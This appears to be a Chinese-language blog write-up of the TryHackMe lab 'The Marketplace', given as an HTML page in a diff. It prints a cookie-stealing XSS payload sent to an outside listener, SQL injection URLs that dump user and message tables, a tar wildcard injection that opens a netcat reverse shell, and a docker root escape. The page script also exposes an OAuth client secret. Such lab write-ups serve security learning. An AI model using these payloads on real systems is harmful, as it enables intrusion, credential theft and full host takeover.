@@ -1,0 +1,308 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>TryHackMe | The Marketplace | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="TryHackMe | The Marketplace | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+基于目前的就业形势，不会渗透真的很难找碗饭吃😭😭😭，写一下博客记录一下学习过程
+XSS
+nmap扫描一下端口，开了80、22和Filenet-TMS服务
+
+首先看看web服务，有两篇文章。
+
+文章里给了联系方式和举报该文章。举报..." />
+    <meta name="keywords" content="TryHackMe,渗透,提权" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              TryHackMe | The Marketplace
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-03-25
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/tryhackme/" class="post-tag">
+                  # TryHackMe
+                </a>
+              
+                <a href="https://le1a.github.io/tag/shen-tou/" class="post-tag">
+                  # 渗透
+                </a>
+              
+                <a href="https://le1a.github.io/tag/ti-quan/" class="post-tag">
+                  # 提权
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>基于目前的就业形势，不会渗透真的很难找碗饭吃😭😭😭，写一下博客记录一下学习过程</p>
+<h1 id="xss">XSS</h1>
+<p>nmap扫描一下端口，开了80、22和Filenet-TMS服务</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/07d8952d73e5e.png" alt="1679729117456.png" loading="lazy"></figure>
+<p>首先看看web服务，有两篇文章。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/c42d3c2852fe0.png" alt="1679729748547.png" loading="lazy"></figure>
+<p>文章里给了联系方式和举报该文章。举报后管理员会来检查该文章是否违规</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/40e11635bae34.png" alt="1679729809676.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/53d912496596c.png" alt="1679729868726.png" loading="lazy"></figure>
+<p>也就是我们可以构造一个XSS页面，然后让举报后让管理员访问</p>
+<p>进入<code>http://10.10.109.227/new</code>创建一个文章</p>
+<pre><code class="language-javascript">&lt;script&gt;document.location='http://10.17.35.179:12345/?cookie='+document.cookie&lt;/script&gt;
+</code></pre>
+<p>因为我们点进去就会执行并跳转了，所以可以直接选择进入<code>http://10.10.109.227/report/3</code></p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/03b8812517e44.png" alt="1679731401067.png" loading="lazy"></figure>
+<p>替换一下cookie里的token值，即可成为管理员</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/642832082f2eb.png" alt="1679731444451.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/d8adbbbac77d8.png" alt="1679731522005.png" loading="lazy"></figure>
+<h1 id="sql注入">Sql注入</h1>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/e26bd45c7612e.png" alt="1679732038278.png" loading="lazy"></figure>
+<pre><code class="language-cmd">http://10.10.215.254/admin?user=1 and sleEp(3);
+
+http://10.10.215.254/admin?user=-1 union select database(),2,3,4
+
+http://10.10.215.254/admin?user=-1 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema='marketplace'
+
+http://10.10.215.254/admin?user=-1 union select group_concat(column_name),2,3,4 from information_schema.columns where table_name='users'
+
+http://10.10.215.254/admin?user=-1 union select group_concat(username,password),2,3,4 from users
+</code></pre>
+<p>得到用户密码hash，但没爆破出来，从另一个表中获得明文密码</p>
+<pre><code class="language-cmd">http://10.10.215.254/admin?user=-1 union select group_concat(id,user_from,' || ',user_to,' || ',message_content,' || ',is_read,' || '),2,3,4 from messages
+</code></pre>
+<pre><code class="language-cmd">ID: 11 || 3 || Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ || 1 || ,21 || 4 || Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! || 1 || ,31 || 4 || Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! || 1 || ,41 || 4 || Thank you for your report. We have reviewed the listing and found nothing that violates our rules. || 1 || ,51 || 4 || Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee's browsers. || 1 || ,61 || 4 || Thank you for your report. One of our ad
+Is administrator: true
+</code></pre>
+<p>通过user表查询刚才的ID得知是jake的密码</p>
+<pre><code class="language-cmd">http://10.10.215.254/admin?user=-1 union select group_concat(id,'||',username, '||'),2,3,4 from users
+</code></pre>
+<p>使用<code>jake/@b_ENXkGYUCAv3zJ</code>连上ssh</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/2af84c7d15ec8.png" alt="1679744421794.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/7f29e3e8e8d20.png" alt="1679744447280.png" loading="lazy"></figure>
+<pre><code>THM{c3648ee7af1369676e3e4b15da6dc0b4}
+</code></pre>
+<h1 id="横向-suid提权">横向 + suid提权</h1>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/ccee130c5731a.png" alt="1679744486805.png" loading="lazy"></figure>
+<p>这里发现<code>sudo -l</code>发现另一个用户<code>michael</code>创建的backup.sh，并且我们的<code>jake</code>用户运行，而且<code>michael</code>在docker组里，貌似想让我们获得<code>michael</code>的权限，通过以下命令反弹shell。</p>
+<pre><code class="language-bash">echo &quot;mkfifo /tmp/uvity; nc 10.17.35.179 4444 0&lt;/tmp/uvity | /bin/sh &gt;/tmp/uvity 2&gt;&amp;1; rm /tmp/uvity&quot; &gt; shell.sh
+
+echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
+
+echo &quot;&quot; &gt; --checkpoint=1
+
+sudo -u michael ./backup.sh
+</code></pre>
+<ol>
+<li><code>echo &quot;mkfifo /tmp/uvity; nc 10.17.35.179 4444 0&lt;/tmp/uvity | /bin/sh &gt;/tmp/uvity 2&gt;&amp;1; rm /tmp/uvity&quot; &gt; shell.sh</code>该命令将字符串 <code>mkfifo /tmp/uvity; nc 10.17.35.179 4444 0&lt;/tmp/uvity | /bin/sh &gt;/tmp/uvity 2&gt;&amp;1; rm /tmp/uvity</code> 写入名为 <code>shell.sh</code> 的文件中。这个命令实际上是将一个反向 shell 放在 <code>/tmp/uvity</code> 管道中，将管道中的输出流重定向到远程主机的 IP 地址为 <code>10.17.35.179</code>、端口为 <code>4444</code> 的网络监听程序中。这个命令还会将 shell 的标准输入、标准输出和标准错误流重定向到 <code>/tmp/uvity</code> 管道中，并在命令执行完毕后删除这个管道文件。</li>
+<li><code>echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</code>该命令将一个空字符串写入名为 <code>--checkpoint-action=exec=sh shell.sh</code> 的文件中。这个文件名中包含了 <code>--checkpoint-action</code> 参数，它指定在运行 <code>tar</code> 命令时触发的动作，这里指定的动作是执行一个名为 <code>shell.sh</code> 的脚本。</li>
+<li><code>echo &quot;&quot; &gt; --checkpoint=1</code>该命令将一个空字符串写入 <code>--checkpoint</code> 参数指定的检查点文件中，这里指定的检查点文件是编号为 <code>1</code> 的检查点文件。这些命令一起构成了一个攻击脚本，用于利用 GNU <code>tar</code> 命令的一个漏洞，在解包压缩文件时执行恶意代码。这个攻击脚本在触发第一个检查点时会执行 <code>shell.sh</code> 脚本，将一个反向 shell 连接回攻击者控制的远程主机。</li>
+</ol>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/a4830ff19d570.png" alt="1679744620867.png" loading="lazy"></figure>
+<p>弹回来的shell功能并不完善，弹一个<code>TTY Spawn Shell</code>回来</p>
+<pre><code class="language-bash">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>然后使用docker进行suid提权</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/199286b02a937.png" alt="1679755042905.png" loading="lazy"></figure>
+<pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/25/7cedda2d8b13e.png" alt="1679744675436.png" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#xss">XSS</a></li>
+<li><a href="#sql%E6%B3%A8%E5%85%A5">Sql注入</a></li>
+<li><a href="#%E6%A8%AA%E5%90%91-suid%E6%8F%90%E6%9D%83">横向 + suid提权</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/picoCTF2023Writeup/">
+              <h3 class="post-title">
+                picoCTF2023 Web Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
